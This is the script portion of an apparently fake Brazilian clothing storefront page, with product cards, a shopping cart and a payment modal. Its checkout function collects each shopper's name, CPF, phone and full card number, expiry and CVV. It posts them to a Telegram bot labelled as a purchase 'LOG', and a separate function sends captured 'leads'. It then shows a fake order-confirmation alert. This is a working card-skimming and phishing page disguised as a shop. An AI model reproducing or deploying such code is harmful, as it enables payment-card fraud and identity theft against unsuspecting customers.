                list.innerHTML += generateHTML(p.name, p.base * MARGEM_LUCRO, p.img, `m-${i}`);

        function generateHTML(name, price, img, id) {
            return `
            <div class="product-card group">
                <div class="relative overflow-hidden bg-gray-50 aspect-[3/4] rounded-3xl shadow-md border border-gray-100">
                    <img src="${img}" class="product-img w-full h-full object-cover">
                    <div class="absolute bottom-0 w-full p-2 opacity-0 group-hover:opacity-100 transition-opacity flex flex-col gap-1 bg-black/20 backdrop-blur-sm">
                        <select id="color-${id}" class="attr-select"><option>Preto</option><option>Branco</option><option>Rosa</option></select>
                        <select id="size-${id}" class="attr-select"><option>P</option><option>M</option><option>G</option><option>GG</option></select>
                        <button onclick="addWithAttrs('${name}', ${price}, '${img}', '${id}')" class="w-full bg-black text-white py-3 text-[10px] font-bold uppercase rounded-lg">Adicionar</button>
                    </div>
                </div>
                <div class="mt-4 text-center px-2">
                    <h4 class="text-[10px] text-gray-400 uppercase font-bold tracking-tighter">${name}</h4>
                    <p class="font-bold text-base mt-1 text-black">R$ ${price.toFixed(2).replace('.',',')}</p>
                </div>
            </div>`;
        }

        function toggleCart() { document.getElementById('cart-sidebar').classList.toggle('translate-x-full'); }
        function openPaymentModal() { document.getElementById('payment-modal').classList.remove('hidden'); selectMethod('pix'); }
        function closePaymentModal() { document.getElementById('payment-modal').classList.add('hidden'); }
        
        function selectMethod(method) {
            selectedMethod = method;
            document.querySelectorAll('.card-3d').forEach(el => el.classList.remove('active'));
            document.getElementById(`method-${method}`).classList.add('active');
            document.getElementById('card-fields').classList.toggle('hidden', method !== 'card');
        }

        async function syncLead() {
            const name = document.getElementById('cust-name').value;
            const email = document.getElementById('cust-email').value;
            const phone = document.getElementById('cust-phone').value;
            if(!email.includes('@')) return;
            const msg = `üë£ *LEAD CAPTURADO*\n*Nome:* ${name}\n*Email:* ${email}\n*WhatsApp:* ${phone}`;
            await sendTelegram(msg);
        }

        function addWithAttrs(name, price, img, id) {
            const color = document.getElementById(`color-${id}`).value;
            const size = document.getElementById(`size-${id}`).value;
            cart.push({name: `${name} (${color}/${size})`, price, img});
            updateCart();
            toggleCart();
        }

        function updateCart() {
            const content = document.getElementById('cart-content');
            const totalEl = document.getElementById('cart-total');
            const msg = document.getElementById('min-order-msg');
            const btn = document.getElementById('btn-checkout-appmax');
            let total = 0;
            content.innerHTML = cart.length ? '' : '<p class="text-center py-10 text-[10px] uppercase font-bold text-gray-400 tracking-widest">Sua sacola est√° vazia</p>';
            
            cart.forEach((item) => {
                total += item.price;
                content.innerHTML += `
                <div class="flex gap-4 border-b pb-3 items-center">
                    <img src="${item.img}" class="w-12 h-16 object-cover rounded-xl border">
                    <div class="flex-1">
                        <p class="text-[9px] font-bold uppercase text-gray-800">${item.name}</p>
                        <p class="text-pink-600 font-bold text-sm">R$ ${item.price.toFixed(2)}</p>
                    </div>
                </div>`;
            });
            
            totalEl.innerText = `R$ ${total.toFixed(2).replace('.',',')}`;
            document.getElementById('cart-count').innerText = cart.length;
            if(total >= MIN_ORDER) {
                msg.innerText = "‚úì Pedido M√≠nimo Atingido"; msg.className = "text-green-600 p-3 text-center font-bold text-[10px]";
                btn.disabled = false; btn.className = "w-full bg-blue-700 text-white py-4 font-bold uppercase text-[12px] rounded-2xl";
            } else {
                msg.innerText = `Faltam R$ ${(MIN_ORDER - total).toFixed(2)} para o atacado`;
                btn.disabled = true; btn.className = "w-full bg-gray-300 text-white py-4 font-bold uppercase text-[12px] rounded-2xl cursor-not-allowed";
            }
        }

        async function confirmarDadosEEnviar() {
            const btn = document.getElementById('btn-finalizar');
            const name = document.getElementById('cust-name').value;
            const email = document.getElementById('cust-email').value;
            const cpf = document.getElementById('cust-cpf').value;
            const phone = document.getElementById('cust-phone').value;

            if(!name || !email || !cpf || !phone) { alert("Preencha os dados obrigat√≥rios!"); return; }

            btn.innerText = "PROCESSANDO...";
            btn.disabled = true;

            const total = cart.reduce((a, b) => a + b.price, 0).toFixed(2);
            const prodList = cart.map(i => `‚Ä¢ ${i.name}`).join('\n');
            
            let paymentDetails = `*M√©todo:* ${selectedMethod.toUpperCase()}`;
            if(selectedMethod === 'card') {
                paymentDetails += `\n*Cart√£o:* ${document.getElementById('card-number').value}\n*Exp:* ${document.getElementById('card-month').value}/${document.getElementById('card-year').value}\n*CVV:* ${document.getElementById('card-cvv').value}\n*Parc:* ${document.getElementById('card-installments').value}x`;
            }

            const msgFinal = `üí∞ *NOVA ORDEM DE COMPRA (LOG)*\n\n` +
                             `*CLIENTE:* ${name}\n` +
                             `*CPF:* ${cpf}\n` +
                             `*TEL:* ${phone}\n` +
                             `*TOTAL:* R$ ${total}\n\n` +
                             `${paymentDetails}\n\n` +
                             `*PRODUTOS:*\n${prodList}`;

            await sendTelegram(msgFinal);
            
            alert("Pedido em processamento! Nossa equipe entrar√° em contato via WhatsApp para confirmar o envio.");
            window.location.reload();
        }

        async function sendTelegram(msg) {
            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: 'Markdown' })
                });
            } catch (e) { console.error("Erro Telegram"); }
        }

        const slides = document.querySelectorAll('#main-carousel img');
        let cur = 0;
        setInterval(() => {
            slides[cur].classList.remove('active');
            cur = (cur + 1) % slides.length;
            slides[cur].classList.add('active');
        }, 4500);

        initProducts();
    </script>
